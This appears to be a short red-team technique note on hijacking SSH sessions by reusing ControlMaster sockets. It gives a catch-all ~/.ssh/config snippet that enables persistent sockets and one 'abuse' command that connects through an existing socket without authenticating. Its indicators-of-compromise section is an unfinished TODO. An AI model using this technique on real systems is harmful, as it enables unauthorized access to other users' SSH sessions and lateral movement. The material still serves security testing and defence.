
# Hijacking SSH With ControlMaster

## Summary

ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection. This functionality can be enabled for a given user by editing their local SSH configuration file in ~/.ssh/config. This will create a socket that can be used without authentication on the client.

## Prerequisites

A client must have SSH installed, with the ability to configure ControlMaster, and the connection must have been made at least once depending on the ControlPersist setting used.

## Setup

To configure ControlMaster, place the following into the clients local SSH config, located at ~/.ssh/config:

```config
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```

if ControlPersist is set to yes, it will never close even when the SSH connection is closed. Otherwise, it will last for the duration this is set to after the connection is closed.

## Execution
### Method 1 - Using the ControlMaster Socket

To abuse this, run the following command on the client to hijack the ControlMaster socket:

```bash
ssh -S /home/user/.ssh/controlmaster/user\@target\:port user@target
```

#### Indicators of Compromise

TODO